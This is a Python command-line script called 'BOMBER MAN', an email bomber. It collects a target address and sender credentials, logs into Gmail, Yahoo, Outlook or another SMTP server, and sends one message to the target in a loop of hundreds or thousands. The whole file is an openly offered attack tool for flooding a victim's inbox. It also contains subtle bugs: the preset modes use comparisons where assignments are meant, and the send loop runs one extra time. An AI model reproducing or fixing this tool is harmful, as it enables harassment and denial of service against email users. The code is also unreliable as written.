import smtplib
import sys

# colors for strings
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print( bcolors.GREEN +
                            "     _-.-.-^^---....,,-- ")
    print(bcolors.GREEN +"   _--/ !               --_ ")
    print(bcolors.GREEN +"  <       _BOOMBER_         >)")
    print(bcolors.GREEN +"  |               _MAN_      |")
    print(bcolors.GREEN +"   \\._                 !  _./ ")
    print(bcolors.GREEN +"      `-`--. . , ; .---'- ")
    print(bcolors.GREEN +"            | |   | ")
    print(bcolors.GREEN +"         .-=||  | |=-. ")
    print(bcolors.GREEN +"         `-=#$%&%$#=-' ")
    print(bcolors.GREEN +"            | ;  :| ")
    print(bcolors.GREEN +"   _____.,-#%&$@%#&#~,._____ ")
    print(bcolors.GREEN + 
          "_"*150)


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED +'\n '+'_'*50 + 'INITIALIZING'+'_'*50 )
            self.target = str(input(bcolors.GREEN + 'Enter target email :3 '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMBER MAN mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) :3 '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Sayonara ! ')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
            print('\n SAYONARA!')


    #setting up the amount of emails to send
    def bomb(self):
        try:
            print(bcolors.RED +'\n '+'_'*50 + 'BOMBER MAN IS GETTING EQUIPPED'+'_'*50)
            self.amount = None
            if self.mode == int(1) :
                self.amount == int(1000)
            elif self.mode == int(2) :
                self.amount == int(500)
            elif self.mode == int(3) :
                self.amount == int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose the amount of Bombs: '))
        
            print(bcolors.RED + '\n' +'_'*10 + f' You have activated BOMBER MAN in mode {self.mode} and {self.amount} bombs' +'_'*10)
        except Exception as e:
            print(f'ERROR: {e}')
            print('\n SAYONARA!')

    #configuring the email fields
    def email(self):
        try :
            print(bcolors.RED +'\n '+'_'*50 + 'SETTING UP EMAIL'+'_'*50)
            self.server = str(input(bcolors.GREEN +'Enter email server | or select premade options -1: Gmail 2:Yahoo 3:Outlook :3 '))
            premade =['1','2','3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN +'Enter Port Number :3 '))

            if default_port:
                self.port = int(587)
            
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            self.fromAddr = str(input(bcolors.GREEN + 'Enter sender address :3 '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter sender password  :3 '))
            self.subject = str(input(bcolors.GREEN + 'Enter email subject  :3 '))
            self.msg = str(input(bcolors.GREEN + 'Enter your message :3 '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n''' % (self.fromAddr, self.target, self.subject, self.msg)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            try:
                self.s.login(self.fromAddr, self.fromPwd)
            except smtplib.SMTPException as e:
                print("Login failed:", e)
                sys.exit()
        except Exception as e:
            print(f'ERROR: {e}')
            print('\n SAYONARA!')
            sys.exit(0)

    #creating the send function for the attack
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target,self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMBER MAN COUNTING: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')
            print('\n SAYONARA!')
            sys.exit()

    #Starting the attack
    def attack(self):
        print(bcolors.RED +'\n '+'_'*50 + 'BOMBER MAN IS DIFFUSING HIS BOMBS'+'_'*50)
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED +'\n '+'_'*50 + 'BOMBER MAN HAS FINISHED THE BOMB ATTACK'+'_'*50)
        sys.exit(0)

if __name__ == '__main__':
    try:
        banner()
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()
    except KeyboardInterrupt:
        print(bcolors.RED+'\nYOU HAVE INTERRUPTED THE ATTACK! SAYONARA')
        sys.exit(1)




